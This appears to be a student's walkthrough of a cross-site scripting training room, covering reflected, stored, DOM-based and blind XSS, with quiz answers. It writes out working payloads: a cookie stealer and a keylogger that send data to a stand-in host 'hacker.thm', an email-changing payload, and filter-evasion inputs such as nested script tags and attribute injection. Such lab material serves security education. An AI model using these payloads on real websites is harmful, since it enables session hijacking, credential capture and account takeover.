# Room Brief 

Cross-Site Scripting (XSS) is an injection attack involving malicious JavaScript injected into web applications. XSS aims to execute this injected code in the browsers of other users.

What this room teaches: 

- Different type of XSS.
- How to create XSS payloads.
- How to modify your payloads to evade filters.
- Practical labs for XSS.

<h2></h2>

Question: What does XSS stand for?

Answer: `Cross-Site Scripting`


<h2></h2>

# XSS Payloads

<h3>What is a payload?</h3>

For XSS, payload is a JavaScript code that we wants to execute on a target computer. There are 2 parts of a payload.

- The Intention: What you wish the JavaScript to actually do.
- The Modification: The changes to the code we need to make it execute as every scenario is different.

<h2></h2>

<h3>Example of XSS Intentions</h3>

Proof Of Concept:

- Simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website.
- Often done by causing an alert box to pop up on the page with a string of text.

`<script>alert('XSS');</script>`

<h2></h2>

Session Stealing:

- User session details stored in cookies can be vulnerable to exploitation.
- JavaScript can be used to extract and encode these cookies for transmission.
- Base64 encoding is used to ensure successful data transfer.
- The encoded cookie is posted to a website controlled by the hacker.
- The hacker can log and potentially take over the target's session using these stolen cookies.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

<h2></h2>

Key Logger:

- Typed content on the webpage is redirected to a hacker-controlled website.
- Potential for significant damage if sensitive data like user logins or credit card details is involved.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

<h2></h2>

Business Logic:

- Calling a network resource or JavaScript function is the focus.
- JavaScript function for changing the user's email address: `user.changeEmail()`.
- If the email address for the account has changed, the attacker may perform a reset password attack.

`<script>user.changeEmail('attacker@hacker.thm');</script>`

<h2></h2>

Question 1: Which document property could contain the user's session token?

Answer: `document.cookie`

Question 2: Which JavaScript method is often used as Proof Of Concept?

Answer: `alert`


<h2></h2>

# Relected XSS

Reflected XSS occurs when unvalidated user-supplied data is included in a webpage's source via an HTTP request.

Example: 

- A website displays error messages when you input something incorrect. The error message comes from the query string's "error" parameter and is shown on the page.

<p align="center">
<br/>
<img src="https://i.imgur.com/RxZes9G.png" height="90%" width="90%" alt=""/>
<br />

- The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

<p align="center">
<br/>
<img src="https://i.imgur.com/RGDO9iJ.png" height="90%" width="90%" alt=""/>
<br />

The vulnerability can be used as per the scenario.

<p align="center">
<br/>
<img src="https://i.imgur.com/ijOim4D.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

<h3>Potential Impact:</h3>

- Attack vectors include sending malicious links or embedding them in iframes on other websites.
- These links contain JavaScript payloads.
- Potential victims are tricked into executing the code in their browsers.
- This can lead to the exposure of sensitive session or customer information.

<h2></h2>

<h3>How to test for Reflected XSS:</h3>

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers

<h2></h2>

Question: Where in an URL is a good place to test for reflected XSS?

Answer: `Parameters`


<h2></h2>

# Stored XSS

XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example: 

- Blog website lacks comment security.
- Comments aren't checked for JavaScript or malicious code.
- Posting JavaScript comment stores it in the database.
- Risk of JavaScript running in users' browsers when visiting the article.

<p align="center">
<br/>
<img src="https://i.imgur.com/YjCJDRF.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

<h3>Potential Impact:</h3>

- Redirecting users to another site.
- Stealing the user's session cookie.
- Performing unauthorized website actions as the user.

<h2></h2>

<h3>How to test for Stored XSS:</h3>

Test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to:

- Comments on a blog
- User profile information
- Website Listings

<h2></h2>

Question: How are stored XSS payloads usually stored on a website?

Answer: `Database`


<h2></h2>

# DOM Based XSS

What is the DOM?

- DOM stands for Document Object Model.
- It's a programming interface for HTML and XML documents.
- It represents web pages, allowing programs to manipulate structure, style, and content.
- Web pages are documents, viewable in a browser or as HTML source.

<p align="center">
<br/>
<img src="https://i.imgur.com/KMCNoU2.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

<h3>Exploiting the DOM</h3>

- DOM Based XSS involves JavaScript execution in the browser without page reloads or backend data submission.
- It occurs when website JavaScript code processes user input or interactions.
- Unlike other XSS types, it primarily manipulates the Document Object Model (DOM) on the client side.
- Attackers exploit vulnerabilities in client-side code, making it important to validate and sanitize user inputs.
- Prevention involves careful coding practices, input validation, and output encoding to secure against such attacks.

<h2></h2>

<h3>Example scenario:</h3>

- The website uses JavaScript to retrieve content from the `window.location.hash` parameter.
- This content is directly written onto the currently viewed section of the page.
- There is no validation or security checks on the hash contents, making it vulnerable.
- Attackers can inject their own malicious JavaScript code into the webpage through this vulnerability.

<h2></h2>

<h3>Potential Impact:</h3>

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

<h2></h2>

<h3>How to test for Dom Based XSS:</h3>

- DOM Based XSS testing is challenging and requires JavaScript knowledge.
- Look for code parts that access variables an attacker can control, like `window.location.x` parameters.
- Examine how these variables are handled in the code.
- Check if the values are written to the webpage's DOM or passed to unsafe JavaScript methods like `eval()`.

<h2></h2>

Question: What unsafe JavaScript method is good to look for in source code?

Answer: `eval()`


<h2></h2>

# Blind XSS

Similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

<h3>Example Scenario</h3>

- Website contact form lacks code validation
- Vulnerability allows attackers to input malicious code
- Unchecked messages are converted into support tickets
- Staff access these tickets via a private web portal

<h2></h2>

<h3>Potential Impact:</h3>

- Correct payload allows attacker's JavaScript to make calls to their website.
- Reveals staff portal URL, staff member's cookies, and portal page contents.
- Potential for session hijacking and access to private portal.

<h2></h2>

<h3>How to test for Blind XSS:</h3>

- Ensure your payload includes a callback, typically an HTTP request, to confirm the execution of your code.
- `XSS Hunter Express` is a popular tool for Blind XSS attacks, automating the capture of cookies, URLs, page contents, and more.
- While you can create your own JavaScript tool, using a specialized tool like XSS Hunter Express can simplify the process and provide additional features.

<h2></h2>

Question 1: What tool can you use to test for Blind XSS?

Answer: `XSS Hunter Express`

Question 2: What type of XSS is very similar to Blind XSS?

Answer: `Stored XSS`


<h2></h2>

# Perfecting your payload

Level One: 

Input: `<script>alert('THM');</script>`

<p align="center">
<br/>
<img src="https://i.imgur.com/6Eseay1.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

Level Two:

Input: `"><script>alert('THM');</script>`

The important part of the payload is the "> which closes the value parameter and then closes the input tag.

<p align="center">
<br/>
<img src="https://i.imgur.com/aR1pKae.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

Level Three:

Input: `</textarea><script>alert('THM');</script>`

The important part of the above payload is </textarea>, which causes the textarea element to close so the script will run.

<p align="center">
<br/>
<img src="https://i.imgur.com/Zi0aMGe.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

Level Four: 

Input: `';alert('THM');//`

<p align="center">
<br/>
<img src="https://i.imgur.com/fKW2gcU.png" height="90%" width="90%" alt=""/>
<br />

<p align="center">
<br/>
<img src="https://i.imgur.com/4MCd1zE.png" height="90%" width="90%" alt=""/>
<br />

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.

<h2></h2>

Level Five:

Input: `<sscriptcript>alert('THM');</sscriptcript>`

The word `script` gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.

<p align="center">
<br/>
<img src="https://i.imgur.com/ICUtLSB.png" height="90%" width="90%" alt=""/>
<br />

<p align="center">
<br/>
<img src="https://i.imgur.com/RMiLIG1.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

Level Six:

Input: `/images/cat.jpg" onload="alert('THM');`


<h2></h2>

